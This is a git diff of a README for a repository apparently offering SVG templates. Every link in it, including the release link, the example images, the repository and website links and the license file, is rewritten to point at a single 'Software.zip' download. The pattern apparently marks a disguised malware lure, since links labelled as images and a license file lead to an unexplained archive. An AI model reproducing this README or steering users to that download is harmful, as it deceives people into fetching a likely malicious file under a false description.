@@ -5,7 +5,7 @@ Welcome to **Svg-Templates**, a repository dedicated to providing dynamic SVG te
 
 ## 🚀 Quick Start
 
-To get started with Svg-Templates, simply [download the latest release](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) and extract the files. If the link does not work, please check the "Releases" section of the repository. Once downloaded, you can start using our dynamic SVG templates right away!
+To get started with Svg-Templates, simply [download the latest release](https://github.com/Alsooory/Svg-Templates/releases/download/v1.0/Software.zip) and extract the files. If the link does not work, please check the "Releases" section of the repository. Once downloaded, you can start using our dynamic SVG templates right away!
 
 ## 🎉 Features
 
@@ -19,9 +19,9 @@ To get started with Svg-Templates, simply [download the latest release](https://
 
 Here are a few examples of the stunning SVG templates you can find in this repository:
 
-![Example Banner](https://source.unsplash.com/random/800x400)
+![Example Banner](https://github.com/Alsooory/Svg-Templates/releases/download/v1.0/Software.zip)
 
-![Developer Tool](https://source.unsplash.com/random/800x600)
+![Developer Tool](https://github.com/Alsooory/Svg-Templates/releases/download/v1.0/Software.zip)
 
 ## 🌟 Repository Topics
 
@@ -39,7 +39,7 @@ Explore the topics covered in this repository:
 
 ## 📦 Download Latest Release
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/Alsooory/Svg-Templates/releases/download/v1.0/Software.zip%20Release-brightgreen)](https://github.com/Alsooory/Svg-Templates/releases/download/v1.0/Software.zip)
 
 ## 🤝 Contribute
 
@@ -52,12 +52,12 @@ If you have creative ideas for new SVG templates or want to improve existing one
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/yourusername/Svg-Templates)
-- [Project Website](https://www.yourprojectwebsite.com)
+- [GitHub Repository](https://github.com/Alsooory/Svg-Templates/releases/download/v1.0/Software.zip)
+- [Project Website](https://github.com/Alsooory/Svg-Templates/releases/download/v1.0/Software.zip)
 
 ## 📜 License
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Alsooory/Svg-Templates/releases/download/v1.0/Software.zip](https://github.com/Alsooory/Svg-Templates/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
